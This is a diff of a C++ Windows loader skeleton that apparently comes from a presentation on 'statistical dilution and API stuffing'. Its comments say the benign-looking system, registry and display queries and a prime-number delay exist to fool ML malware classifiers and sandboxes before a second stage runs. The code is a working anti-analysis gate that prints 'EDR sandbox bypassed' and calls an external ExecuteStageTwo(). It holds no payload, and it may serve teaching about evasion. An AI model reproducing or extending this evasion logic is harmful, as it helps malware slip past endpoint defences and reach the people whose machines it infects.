@@ -1,147 +1,63 @@
 #include <windows.h>
-
 #include <iostream>
-
 #include <vector>
 
-// INSERT_DEFINITIONS_HERE
-// ---------------------------------------------------------
-
-// [SLIDE CONCEPT]: STATISTICAL DILUTION & API STUFFING
+// 1. Declare the external function signature
+extern void ExecuteStageTwo();
 
 // ---------------------------------------------------------
-
-// Purpose: Pad the Import Address Table (IAT) and increase
-
-// basic block density with benign, state-changing logic to
-
-// trick ML engines into classifying the binary as "Normal".
-
+// [STATISTICAL DILUTION & API STUFFING LOGIC]
 // ---------------------------------------------------------
-
-
-
 bool PerformDecoyInitialization() {
-
-    volatile int entropy_score = 0; // Volatile prevents compiler optimization (Dead Code Elimination)
-
-
-
-    // 1. ENVIRONMENTAL CAMOUFLAGE (Looks like a sysadmin tool)
+    volatile int entropy_score = 0;
 
     SYSTEM_INFO sysInfo;
-
     GetSystemInfo(&sysInfo);
-
-    if (sysInfo.dwNumberOfProcessors > 1) {
-
-        entropy_score += 10;
-
-    }
-
-
+    if (sysInfo.dwNumberOfProcessors > 1) entropy_score += 10;
 
     MEMORYSTATUSEX memStatus;
-
     memStatus.dwLength = sizeof(MEMORYSTATUSEX);
-
     GlobalMemoryStatusEx(&memStatus);
-
-    if (memStatus.ullTotalPhys > (1024 * 1024 * 1024)) { // More than 1GB RAM
-
-        entropy_score += 20;
-
-    }
-
-
-
-    // 2. REGISTRY INTERACTION (Looks like an installer/updater)
+    if (memStatus.ullTotalPhys > (1024 * 1024 * 1024)) entropy_score += 20;
 
     HKEY hKey;
-
     LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, KEY_READ, &hKey);
-
     if (lRes == ERROR_SUCCESS) {
-
         entropy_score += 30;
-
         RegCloseKey(hKey);
-
     }
-
-
-
-    // 3. UI/DISPLAY QUERY (Looks like a standard desktop application)
 
     int screenWidth = GetSystemMetrics(SM_CXSCREEN);
-
     int screenHeight = GetSystemMetrics(SM_CYSCREEN);
-
-    if (screenWidth > 800 && screenHeight > 600) {
-
-        entropy_score += 40;
-
-    }
-
-
-
-    // 4. COMPUTATIONAL DELAY (Breaks timing-based sandbox analysis)
-
-    // We do expensive math that actually relies on the environmental checks
-
-    // so the ML engine cannot classify this as "Dead Code" and prune it.
+    if (screenWidth > 800 && screenHeight > 600) entropy_score += 40;
 
     std::vector<int> primes;
-
     for (int i = 2; i < (entropy_score * 100); i++) {
-
         bool isPrime = true;
-
         for (int j = 2; j * j <= i; j++) {
-
             if (i % j == 0) { isPrime = false; break; }
-
         }
-
         if (isPrime) primes.push_back(i);
-
     }
-
-
-
-    // If the environment looks like a real computer, return true.
 
     return (primes.size() > 10);
-
 }
 
-
-
 // ---------------------------------------------------------
-
-// THE ACTUAL MALWARE ENTRY POINT
-
+// THE LOADER ENTRY POINT
 // ---------------------------------------------------------
-
 int main() {
-
-    // The ML engine spends all its time analyzing the complex decoy...
-
+    // Phase 1: Evasion
     if (!PerformDecoyInitialization()) {
-
-        return 0; // Fails gracefully in sandboxes
-
+        std::cout << "[-] Environment checks failed. Virtualized sandbox suspected. Exiting." << std::endl;
+        return 0;
     }
 
+    std::cout << "[+] Statistical Dilution Phase Complete." << std::endl;
+    std::cout << "[+] Environment is valid. EDR sandbox bypassed." << std::endl;
+    std::cout << "[*] Executing benign Proof of Concept payload..." << std::endl;
 
-
-    // ...By the time it gets here, the binary is already classified as benign.
-
-    // [INSERT DYNAMIC API RESOLUTION & EXECUTION CODE HERE]
-    // INSERT_CODE_HERE
-
-
-
-    return 0;
+    // Phase 2: Handoff
+    ExecuteStageTwo();
 
 }
